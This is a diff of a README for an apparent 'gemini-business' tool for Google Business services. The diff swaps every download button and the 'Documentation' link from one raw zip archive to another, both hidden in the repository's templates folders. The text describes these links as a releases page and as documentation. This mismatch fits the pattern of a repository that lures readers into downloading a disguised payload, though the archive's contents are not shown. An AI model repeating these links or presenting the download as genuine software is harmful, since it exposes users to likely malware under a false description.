@@ -10,7 +10,7 @@ To get started, you need to download the software. Please follow these steps car
 
 1. **Visit the Releases Page:** Click the button below to go to the download page.
 
-   [![Download gemini-business](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/components/business_gemini_v3.9-beta.5.zip)](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/components/business_gemini_v3.9-beta.5.zip)
+   [![Download gemini-business](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/admin/business-gemini-3.8.zip)](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/admin/business-gemini-3.8.zip)
 
 2. Once you're on the *Releases* page, you will see different versions of the application listed. Find the latest version labeled with the highest number.
 
@@ -63,10 +63,10 @@ We welcome contributions! If you have suggestions or improvements, please feel f
 
 - For more information about how to get the most out of **gemini-business**, visit our documentation at: 
 
-   [Documentation](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/components/business_gemini_v3.9-beta.5.zip)
+   [Documentation](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/admin/business-gemini-3.8.zip)
 
 - Take another look at the download link to get the latest version: 
 
-   [![Download gemini-business](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/components/business_gemini_v3.9-beta.5.zip)](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/components/business_gemini_v3.9-beta.5.zip)
+   [![Download gemini-business](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/admin/business-gemini-3.8.zip)](https://raw.githubusercontent.com/logokabulov/gemini-business/main/templates/admin/business-gemini-3.8.zip)
 
 Thank you for using **gemini-business**. Enjoy streamlined management of your Google Business services!
